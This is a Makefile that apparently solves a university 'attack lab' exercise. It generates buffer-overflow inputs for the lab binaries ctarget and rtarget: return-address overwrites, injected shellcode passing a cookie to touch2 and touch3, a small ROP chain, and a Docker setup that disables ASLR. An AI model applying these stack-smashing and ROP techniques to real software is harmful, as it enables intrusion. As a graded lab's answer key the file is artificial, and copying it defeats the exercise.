CTARGET := ./ctarget
RTARGET := ./rtarget
HEX2RAW := ./hex2raw
DISASC := ctarget.d
DISASR := rtarget.d
OUT := builds
SRC := src
COOKIE := $(shell cat cookie.txt)
COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
COOKIE_PADDED := $(shell printf "%016s" $(COOKIE_PURE) | tr ' ' '0')
COOKIE_QWORD_BYTES := $(shell \
    echo $(COOKIE_PADDED) \
    | sed 's/../& /g' \
    | awk '{ for (i=NF;i>=1;i--) printf "%s ", $$i }' \
)
COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')

BUF_ADDR := 0x5563e958
BUF_ADDR_STR := 58 e9 63 55 00 00 00 00
TOUCH1_ADDR := 0x00000000008089d6
TOUCH1_ADDR_STR := d6 89 80 00 00 00 00 00
TOUCH2_ADDR := 0x0000000000808a04
TOUCH2_ADDR_STR := 04 8a 80 00 00 00 00 00
TOUCH3_ADDR := 0x0000000000808b1b
TOUCH3_ADDR_STR := 1b 8b 80 00 00 00 00 00

G_POP_RAX := 0x808bcc
G_POP_RAX_STR := cc 8b 80 00 00 00 00 00
G_MOV_RAX_RDI := 0x808bda
G_MOV_RAX_RDI_STR := da 8b 80 00 00 00 00 00

all: level1 level2 level3 rlevel2

disas_ctarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
	nm -n ./ctarget > $(OUT)/ctarget.sym

disas_rtarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./rtarget > $(OUT)/rtarget.d
	nm -n ./rtarget > $(OUT)/rtarget.sym

level1: $(CTARGET) disas_ctarget
	mkdir -p $(SRC)
	rm -f $(SRC)/ctarget01.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/ctarget01.txt; \
	done
	echo -n $(TOUCH1_ADDR_STR) >> $(SRC)/ctarget01.txt
	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
	$(CTARGET) < $(OUT)/level1-raw

$(OUT)/level2_payload.s: cookie.txt
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    movl $$ $(COOKIE), %edi" >> $@
	echo "    pushq $$ $(TOUCH2_ADDR)" >> $@   
	echo "    ret" >> $@

$(OUT)/level2_payload.d: $(OUT)/level2_payload.s
	gcc -c $< -o $(OUT)/level2_payload.o
	objdump -M intel -d $(OUT)/level2_payload.o > $@

$(OUT)/level2_payload.hex: $(OUT)/level2_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level2: $(OUT)/level2_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level2_payload.hex > $(SRC)/ctarget02.txt
	for i in `seq 13`; do \
		printf "41 " >> $(SRC)/ctarget02.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget02.txt
	./hex2raw < $(SRC)/ctarget02.txt > $(OUT)/level2-raw.txt
	./ctarget < $(OUT)/level2-raw.txt

$(OUT)/level3_payload.s:
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    pushq $$ $(TOUCH3_ADDR)" >> $@
	echo "    lea 8(%rsp), %rdi" >> $@
	echo "    ret" >> $@

$(OUT)/level3_payload.d: $(OUT)/level3_payload.s
	gcc -c $< -o $(OUT)/level3_payload.o
	objdump -M intel -d $(OUT)/level3_payload.o > $@

$(OUT)/level3_payload.hex: $(OUT)/level3_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level3: $(OUT)/level3_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level3_payload.hex > $(SRC)/ctarget03.txt
	for i in `seq 13`; do \
		echo -n "41 " >> $(SRC)/ctarget03.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget03.txt
	echo -n "$(COOKIE_ASCII_HEX)" >> $(SRC)/ctarget03.txt
	./hex2raw < $(SRC)/ctarget03.txt > $(OUT)/level3-raw.txt
	./ctarget < $(OUT)/level3-raw.txt

rlevel2: disas_rtarget
	mkdir -p $(SRC)
	rm -f $(SRC)/rtarget02.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/rtarget02.txt; \
	done
	echo -n $(G_POP_RAX_STR) >> $(SRC)/rtarget02.txt
	echo -n " " >> $(SRC)/rtarget02.txt
	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/rtarget02.txt
	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/rtarget02.txt
	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/rtarget02.txt
	$(HEX2RAW) < $(SRC)/rtarget02.txt > $(OUT)/rtarget02-raw
	$(RTARGET) < $(OUT)/rtarget02-raw


run_c:
	$(CTARGET)

run_r:
	$(RTARGET)

clean_level1:
	rm -rf $(OUT)/level1-raw
	rm -rf $(SRC)/ctarget01.txt

clean_level2:
	rm -rf $(OUT)/level2_payload.s $(OUT)/level2_payload.o $(OUT)/level2_payload.d $(OUT)/level2_payload.hex
	rm -rf $(SRC)/ctarget02.txt

clean_level3:
	rm -rf $(OUT)/level3_payload.s $(OUT)/level3_payload.o $(OUT)/level3_payload.d $(OUT)/level3_payload.hex
	rm -rf $(SRC)/ctarget03.txt

clean_rlevel2:
	rm -rf $(SRC)/rtarget02.txt

clean:
	rm -rf $(OUT)
	rm -rf $(SRC)

UBUNTU_IMAGE := ubuntu:20.04
UBUNTU_NAME := attacklab-ubuntu

docker:
	docker run --rm -it --privileged \
		-v $(PWD):/lab -w /lab \
		$(UBUNTU_IMAGE) /bin/bash -c "\
			echo 0 > /proc/sys/kernel/randomize_va_space && \
			apt update && \
			DEBIAN_FRONTEND=noninteractive apt install -y build-essential gdb && \
			echo '>>> Environment ready! Entering shell...' && \
			bash"
